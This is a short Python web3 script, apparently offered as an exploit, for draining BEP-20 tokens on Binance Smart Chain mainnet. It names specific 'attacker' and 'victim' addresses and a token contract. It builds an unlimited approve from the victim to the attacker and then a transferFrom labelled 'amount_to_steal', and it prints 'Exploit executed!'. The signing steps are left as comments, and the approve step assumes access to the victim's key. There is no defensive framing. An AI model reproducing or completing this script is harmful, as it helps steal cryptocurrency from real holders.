import json
from web3 import Web3

# Connect to local node or testnet
w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org"))


# Addresses
attacker = "0x9701b5f824873560ad5670De0891D8D80F998eBa"  # replace with your attacker address
victim = "0xDA5eEeF71CE9892b79b0215E771153f84930A653"    # replace with victim (has tokens)

# Set contract address and ABI
contract_address = "0xc461CE1893895ea6eA3dacFe03dbd14120BFf8ba"
with open("C.json") as f:
    abi = json.load(f)

# Create contract instance
token = w3.eth.contract(address=contract_address, abi=abi)

# Step 1: Approve attacker from victim (simulate or do this manually if needed)
tx1 = token.functions.approve(attacker, 2**256 - 1).build_transaction({
    "from": victim,
    "nonce": w3.eth.get_transaction_count(victim),
    "gas": 200000,
    "gasPrice": w3.to_wei("5", "gwei")
})

# Sign and send with victim's private key

# Step 2: Attacker drains funds via transferFrom repeatedly
amount_to_steal = 100000 * 10**8  # change as needed
tx2 = token.functions.transferFrom(victim, attacker, amount_to_steal).build_transaction({
    "from": attacker,
    "nonce": w3.eth.get_transaction_count(attacker),
    "gas": 200000,
    "gasPrice": w3.to_wei("5", "gwei")
})
# Sign and send with attacker's private key

print("Exploit executed!")
